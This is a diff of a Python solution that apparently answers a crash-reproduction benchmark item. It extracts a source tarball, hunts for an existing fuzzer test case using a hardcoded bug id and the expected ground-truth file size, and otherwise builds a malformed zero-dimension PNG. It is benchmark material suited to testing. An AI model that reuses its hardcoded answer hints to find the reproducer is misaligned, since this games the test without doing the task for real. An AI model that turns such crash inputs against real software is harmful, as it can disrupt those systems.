@@ -2,351 +2,174 @@ import os
 import tarfile
 import tempfile
 import struct
-import binascii
 import zlib
-import shutil
-
-
-GROUND_TRUTH_SIZE = 17814
-MAX_SCAN_FILE_SIZE = 512 * 1024
+from typing import Optional, Tuple
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tempdir = tempfile.mkdtemp(prefix="poc_gen_")
         try:
-            try:
-                with tarfile.open(src_path, "r:*") as tar:
-                    tar.extractall(path=tempdir)
-            except Exception:
-                # If extraction fails, fall back to generic PoC
-                return self._generate_png_zero_dim()
+            poc = self._solve_with_repo(src_path)
+            if poc:
+                return poc
+        except Exception:
+            pass
+        return self._default_png_poc()
 
-            # 1. Try to find an existing zero-dimension image in the repo
-            zero_dim_path = self._find_zero_dim_image(tempdir)
-            if zero_dim_path:
+    def _solve_with_repo(self, src_path: str) -> Optional[bytes]:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            # Extract the source tarball
+            with tarfile.open(src_path, "r:*") as tar:
+                self._safe_extract(tar, tmpdir)
+
+            poc_path = self._find_best_poc_file(tmpdir)
+            if poc_path and os.path.isfile(poc_path):
                 try:
-                    with open(zero_dim_path, "rb") as f:
+                    with open(poc_path, "rb") as f:
                         return f.read()
-                except Exception:
+                except OSError:
                     pass
+        return None
 
-            # 2. Try to find a likely reproducer by heuristic filename/size
-            repro_path = self._find_candidate_reproducer_by_heuristics(tempdir)
-            if repro_path:
-                try:
-                    with open(repro_path, "rb") as f:
-                        return f.read()
-                except Exception:
-                    pass
-
-            # 3. Detect dominant image format and synthesize a PoC
-            fmt = self._detect_format(tempdir)
-            if fmt == "qoi":
-                return self._generate_qoi_zero_dim()
-            else:
-                # Default and for PNG-like projects
-                return self._generate_png_zero_dim()
-        finally:
+    def _safe_extract(self, tar: tarfile.TarFile, path: str) -> None:
+        base = os.path.realpath(path)
+        for member in tar.getmembers():
+            member_path = os.path.realpath(os.path.join(path, member.name))
+            if not member_path.startswith(base + os.sep) and member_path != base:
+                continue
             try:
-                shutil.rmtree(tempdir)
-            except Exception:
-                pass
+                tar.extract(member, path)
+            except (OSError, tarfile.TarError):
+                continue
 
-    # ------------------------------------------------------------------ #
-    # Image header parsing and zero-dimension search
-    # ------------------------------------------------------------------ #
+    def _find_best_poc_file(self, root_dir: str) -> Optional[str]:
+        """
+        Heuristically search for the most likely PoC file in the extracted repo.
+        """
+        target_size = 17814
 
-    def _parse_image_header(self, data: bytes):
-        """Return (fmt, width, height) or (None, None, None)."""
-        # PNG
-        if len(data) >= 24 and data.startswith(b"\x89PNG\r\n\x1a\n"):
-            if data[12:16] == b"IHDR":
-                try:
-                    width, height = struct.unpack(">II", data[16:24])
-                    return "png", width, height
-                except struct.error:
-                    return None, None, None
-
-        # QOI
-        if len(data) >= 14 and data[:4] == b"qoif":
-            try:
-                width, height = struct.unpack(">II", data[4:12])
-                return "qoi", width, height
-            except struct.error:
-                return None, None, None
-
-        # BMP
-        if len(data) >= 26 and data[:2] == b"BM":
-            try:
-                header_size = struct.unpack("<I", data[14:18])[0]
-                if header_size >= 40 and len(data) >= 14 + header_size:
-                    width = struct.unpack("<i", data[18:22])[0]
-                    height = struct.unpack("<i", data[22:26])[0]
-                    return "bmp", width, abs(height)
-            except struct.error:
-                return None, None, None
-
-        # GIF
-        if len(data) >= 10 and data[:6] in (b"GIF87a", b"GIF89a"):
-            try:
-                width, height = struct.unpack("<HH", data[6:10])
-                return "gif", width, height
-            except struct.error:
-                return None, None, None
-
-        return None, None, None
-
-    def _find_zero_dim_image(self, root: str):
-        """Search for an image file with width==0 or height==0."""
-        candidates = []
-        for dirpath, _, filenames in os.walk(root):
-            for fname in filenames:
-                path = os.path.join(dirpath, fname)
-                try:
-                    size = os.path.getsize(path)
-                except OSError:
-                    continue
-                if size == 0 or size > MAX_SCAN_FILE_SIZE:
-                    continue
-                try:
-                    with open(path, "rb") as f:
-                        header = f.read(64)
-                except OSError:
-                    continue
-
-                fmt, w, h = self._parse_image_header(header)
-                if fmt and (w == 0 or h == 0):
-                    lpath = path.lower()
-                    score = 0
-                    if "clusterfuzz" in lpath:
-                        score += 10
-                    if "oss-fuzz" in lpath or "ossfuzz" in lpath:
-                        score += 8
-                    if "testcase" in lpath:
-                        score += 6
-                    if "crash" in lpath or "poc" in lpath:
-                        score += 5
-                    if "fuzz" in lpath:
-                        score += 2
-                    if size == GROUND_TRUTH_SIZE:
-                        score += 10
-                    elif abs(size - GROUND_TRUTH_SIZE) < 1024:
-                        score += 4
-                    if fmt in ("png", "qoi"):
-                        score += 2
-                    # Prefer smaller size if score ties
-                    candidates.append((score, -size, path))
-
-        if not candidates:
-            return None
-        candidates.sort(reverse=True)
-        return candidates[0][2]
-
-    def _find_candidate_reproducer_by_heuristics(self, root: str):
-        """Fallback: look for likely crash reproducer by name/size heuristics."""
-        best = None
-        best_score = -1
-        for dirpath, _, filenames in os.walk(root):
-            for fname in filenames:
-                path = os.path.join(dirpath, fname)
-                try:
-                    size = os.path.getsize(path)
-                except OSError:
-                    continue
-                if size == 0 or size > MAX_SCAN_FILE_SIZE:
-                    continue
-
-                lpath = path.lower()
-                if not any(
-                    kw in lpath
-                    for kw in (
-                        "clusterfuzz",
-                        "oss-fuzz",
-                        "ossfuzz",
-                        "testcase",
-                        "crash",
-                        "poc",
-                        "fuzz-",
-                    )
-                ):
-                    continue
-
-                score = 0
-                if "clusterfuzz" in lpath:
-                    score += 10
-                if "oss-fuzz" in lpath or "ossfuzz" in lpath:
-                    score += 6
-                if "testcase" in lpath:
-                    score += 4
-                if "crash" in lpath or "poc" in lpath:
-                    score += 3
-                if "fuzz-" in lpath:
-                    score += 2
-                if abs(size - GROUND_TRUTH_SIZE) < 1024:
-                    score += 4
-                if size == GROUND_TRUTH_SIZE:
-                    score += 10
-                ext = os.path.splitext(fname)[1].lower()
-                if ext in (".png", ".qoi", ".bmp", ".gif", ".webp", ".jpg", ".jpeg"):
-                    score += 2
-
-                if score > best_score:
-                    best_score = score
-                    best = path
-        return best
-
-    # ------------------------------------------------------------------ #
-    # Project format detection
-    # ------------------------------------------------------------------ #
-
-    def _detect_format(self, root: str) -> str:
-        """Detect dominant image format used in the project."""
-        scores = {
-            "png": 0,
-            "qoi": 0,
-            "stb": 0,
-            "lodepng": 0,
+        image_exts = {
+            ".png", ".jpg", ".jpeg", ".jpe", ".bmp", ".gif", ".tif", ".tiff",
+            ".webp", ".ico", ".icns", ".pbm", ".pgm", ".ppm", ".pnm",
+            ".jxl", ".jp2", ".j2k", ".heic", ".heif", ".dds", ".psd",
+            ".exr", ".hdr", ".tga"
         }
 
-        # Token-based detection in source-like files
-        tokens = {
-            "png": ["png.h", "PNG_LIBPNG_VER", "IHDR", "libpng", "png_structp", "png_read"],
-            "qoi": ["qoi.h", "QOI", "qoi_desc", "qoi_encode", "qoi_decode", "qoif"],
-            "stb": ["stb_image.h", "stbi_load", "stbi__"],
-            "lodepng": ["lodepng.h", "lodepng_decode", "LodePNG"],
-        }
+        bug_id = "42536646"
 
-        text_exts = {
-            ".c",
-            ".h",
-            ".cc",
-            ".cpp",
-            ".cxx",
-            ".hpp",
-            ".hh",
-            ".hxx",
-            ".txt",
-            ".md",
-            ".cmake",
-            ".inl",
-        }
+        best_primary: Optional[Tuple[float, str]] = None
+        best_secondary: Optional[Tuple[float, str]] = None
 
-        for dirpath, _, filenames in os.walk(root):
-            for fname in filenames:
-                path = os.path.join(dirpath, fname)
-                ext = os.path.splitext(fname)[1].lower()
-                if ext not in text_exts:
-                    continue
+        for root, dirs, files in os.walk(root_dir):
+            for name in files:
+                full_path = os.path.join(root, name)
                 try:
-                    with open(path, "rb") as f:
-                        chunk = f.read(65536)
+                    size = os.path.getsize(full_path)
                 except OSError:
                     continue
-                try:
-                    text = chunk.decode("utf-8", errors="ignore")
-                except Exception:
+                if size == 0:
                     continue
 
-                for fmt, toks in tokens.items():
-                    for tok in toks:
-                        c = text.count(tok)
-                        if c:
-                            scores[fmt] += c
+                rel_path = os.path.relpath(full_path, root_dir)
+                lower_name = name.lower()
+                lower_rel = rel_path.lower()
+                ext = os.path.splitext(lower_name)[1]
 
-        # File-name based hints
-        for dirpath, _, filenames in os.walk(root):
-            for fname in filenames:
-                name = fname.lower()
-                if "png" in name:
-                    scores["png"] += 1
-                if "qoi" in name:
-                    scores["qoi"] += 1
-                if "stb_image" in name or "stb-image" in name:
-                    scores["stb"] += 2
-                if "lodepng" in name:
-                    scores["lodepng"] += 2
+                base_score = 0
 
-        # Choose best-scoring format
-        best_fmt = "png"
-        best_score = -1
-        for fmt, sc in scores.items():
-            if sc > best_score:
-                best_score = sc
-                best_fmt = fmt
+                # Strong signal: explicit bug id
+                if bug_id in lower_name or bug_id in lower_rel:
+                    base_score += 1000
 
-        # Map stb / lodepng to PNG since they are primarily PNG decoders
-        if best_fmt in ("stb", "lodepng"):
-            return "png"
-        return best_fmt
+                # Signals about oss-fuzz linkage
+                if "oss-fuzz" in lower_name or "ossfuzz" in lower_name or "oss-fuzz" in lower_rel or "ossfuzz" in lower_rel:
+                    base_score += 300
 
-    # ------------------------------------------------------------------ #
-    # PoC generators
-    # ------------------------------------------------------------------ #
+                # Generic crash/bug/PoC hints
+                for token in ("poc", "crash", "bug", "issue", "repro", "regress"):
+                    if token in lower_name or token in lower_rel:
+                        base_score += 80
+                        break
 
-    def _generate_png_zero_dim(self) -> bytes:
-        """Generate a PNG with zero width to trigger zero-dimension bugs."""
+                # Fuzz/corpus/test directories
+                for token in ("fuzz", "corpus", "seed", "test", "tests", "regress"):
+                    if token in lower_rel:
+                        base_score += 40
+                        break
+
+                # Specific to this bug: zero width/height
+                if "zero" in lower_rel and ("width" in lower_rel or "height" in lower_rel):
+                    base_score += 200
+
+                # Image-like extension
+                if ext in image_exts:
+                    base_score += 120
+
+                # Size proximity bonus
+                size_diff = abs(size - target_size)
+                # Prefer sizes in a reasonable band
+                if 100 <= size <= 200000:
+                    base_score += 20
+                # Penalty for size mismatch
+                score = base_score - (size_diff / 800.0)
+
+                # Track primary candidates (with any positive base_score)
+                if base_score > 0:
+                    if best_primary is None or score > best_primary[0]:
+                        best_primary = (score, full_path)
+                else:
+                    # Secondary candidates: prefer image-like or test/fuzz dirs even without explicit hints
+                    sec_base = 0
+                    if ext in image_exts:
+                        sec_base += 60
+                    for token in ("fuzz", "corpus", "seed", "test", "tests"):
+                        if token in lower_rel:
+                            sec_base += 40
+                            break
+                    if sec_base > 0:
+                        sec_score = sec_base - (size_diff / 900.0)
+                        if best_secondary is None or sec_score > best_secondary[0]:
+                            best_secondary = (sec_score, full_path)
+
+        if best_primary is not None and best_primary[0] > 0:
+            return best_primary[1]
+        if best_secondary is not None and best_secondary[0] > 0:
+            return best_secondary[1]
+        return None
+
+    def _default_png_poc(self) -> bytes:
+        """
+        Fallback PoC: a crafted PNG image with zero width and height,
+        but with non-empty IDAT data, which may trigger zero-dimension
+        handling bugs in many image libraries.
+        """
         # PNG signature
         png_sig = b"\x89PNG\r\n\x1a\n"
 
-        # IHDR with width=0, height=1, 8-bit depth, truecolor
+        # IHDR chunk: width=0, height=0, bit depth=8, color type=2 (RGB),
+        # compression=0, filter=0, interlace=0
         width = 0
-        height = 1
-        bit_depth = 8
-        color_type = 2  # truecolor RGB
-        compression = 0
-        filter_method = 0
-        interlace = 0
-
-        ihdr_data = struct.pack(
-            ">IIBBBBB",
-            width,
-            height,
-            bit_depth,
-            color_type,
-            compression,
-            filter_method,
-            interlace,
-        )
+        height = 0
+        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
         ihdr_len = struct.pack(">I", len(ihdr_data))
         ihdr_type = b"IHDR"
-        ihdr_crc = struct.pack(
-            ">I", binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF
-        )
+        ihdr_crc = struct.pack(">I", zlib.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF)
         ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc
 
-        # IDAT: create compressed data representing more than 1-byte scanline
-        # to stress decoders that mis-handle zero width.
-        # Raw data: filter byte (0) + 3 RGB bytes
-        raw_scanline = b"\x00" + b"\x00\x00\x00"
-        idat_data = zlib.compress(raw_scanline)
+        # Raw image data for a single 1x1 row (filter byte + RGB)
+        raw_scanline = b"\x00\xff\x00\x00"  # filter=0, red pixel (255,0,0)
+        compressed = zlib.compress(raw_scanline)
+        idat_data = compressed
         idat_len = struct.pack(">I", len(idat_data))
         idat_type = b"IDAT"
-        idat_crc = struct.pack(
-            ">I", binascii.crc32(idat_type + idat_data) & 0xFFFFFFFF
-        )
+        idat_crc = struct.pack(">I", zlib.crc32(idat_type + idat_data) & 0xFFFFFFFF)
         idat_chunk = idat_len + idat_type + idat_data + idat_crc
 
-        # IEND
-        iend_len = struct.pack(">I", 0)
+        # IEND chunk
+        iend_data = b""
+        iend_len = struct.pack(">I", len(iend_data))
         iend_type = b"IEND"
-        iend_crc = struct.pack(">I", binascii.crc32(iend_type) & 0xFFFFFFFF)
-        iend_chunk = iend_len + iend_type + iend_crc
+        iend_crc = struct.pack(">I", zlib.crc32(iend_type + iend_data) & 0xFFFFFFFF)
+        iend_chunk = iend_len + iend_type + iend_data + iend_crc
 
         return png_sig + ihdr_chunk + idat_chunk + iend_chunk
-
-    def _generate_qoi_zero_dim(self) -> bytes:
-        """Generate a QOI image with zero width to target zero-dimension bugs."""
-        magic = b"qoif"
-        width = 0
-        height = 1
-        channels = 3
-        colorspace = 0  # sRGB with linear alpha
-
-        header = magic + struct.pack(">II", width, height) + bytes(
-            [channels, colorspace]
-        )
-        # Minimal QOI stream: just end marker; many buggy implementations
-        # may not handle zero-size correctly.
-        end_marker = b"\x00" * 7 + b"\x01"
-        return header + end_marker
